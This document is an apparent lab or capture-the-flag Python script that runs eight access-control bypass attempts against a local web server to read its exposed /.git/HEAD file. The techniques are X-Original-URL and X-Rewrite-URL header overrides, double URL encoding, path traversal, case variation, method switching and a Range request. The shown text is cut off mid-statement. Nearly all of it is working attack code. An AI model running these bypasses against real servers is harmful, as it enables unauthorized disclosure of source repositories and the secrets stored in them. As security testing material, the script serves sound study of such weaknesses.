import requests

target = "http://127.0.0.1:32867"

print("[*] Testing .git Bypass Techniques\n")

# Test 1: X-Original-URL header
print("[1] X-Original-URL Header")
try:
    resp = requests.get(f"{target}/.git/HEAD", 
                       headers={"X-Original-URL": "/.git/HEAD"}, 
                       timeout=3)
    print(f"Status: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
    print(f"Response: {resp.text[:300]}\n")
except Exception as e:
    print(f"Error: {e}\n")

# Test 2: X-Rewrite-URL header
print("[2] X-Rewrite-URL Header")
try:
    resp = requests.get(f"{target}/.git/HEAD", 
                       headers={"X-Rewrite-URL": "/.git/HEAD"}, 
                       timeout=3)
    print(f"Status: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
    print(f"Response: {resp.text[:300]}\n")
except Exception as e:
    print(f"Error: {e}\n")

# Test 3: Double URL encoding
print("[3] Double URL Encoding: /%252egit/HEAD")
try:
    resp = requests.get(f"{target}/%252egit/HEAD", timeout=3)
    print(f"Status: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
    print(f"Response: {resp.text[:300]}\n")
except Exception as e:
    print(f"Error: {e}\n")

# Test 4: Path traversal
print("[4] Path Traversal: /test/../.git/HEAD")
try:
    resp = requests.get(f"{target}/test/../.git/HEAD", timeout=3)
    print(f"Status: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
    print(f"Response: {resp.text[:300]}\n")
except Exception as e:
    print(f"Error: {e}\n")

# Test 5: Case variation
print("[5] Case Variation: /.GIT/HEAD")
try:
    resp = requests.get(f"{target}/.GIT/HEAD", timeout=3)
    print(f"Status: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
    print(f"Response: {resp.text[:300]}\n")
except Exception as e:
    print(f"Error: {e}\n")

# Test 6: Accept header
print("[6] Accept: application/octet-stream")
try:
    resp = requests.get(f"{target}/.git/HEAD", 
                       headers={"Accept": "application/octet-stream"}, 
                       timeout=3)
    print(f"Status: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
    print(f"Response: {resp.text[:300]}\n")
except Exception as e:
    print(f"Error: {e}\n")

# Test 7: POST method
print("[7] POST Method")
try:
    resp = requests.post(f"{target}/.git/HEAD", timeout=3)
    print(f"Status: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
    print(f"Response: {resp.text[:300]}\n")
except Exception as e:
    print(f"Error: {e}\n")

# Test 8: Range request
print("[8] Range Request")
try:
    resp = requests.get(f"{target}/.git/HEAD", 
                       headers={"Range": "bytes=0-100"}, 
                       timeout=3)
    print(f"Status: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
    print(f"Response: {resp.text}\n")
except Exception as e:
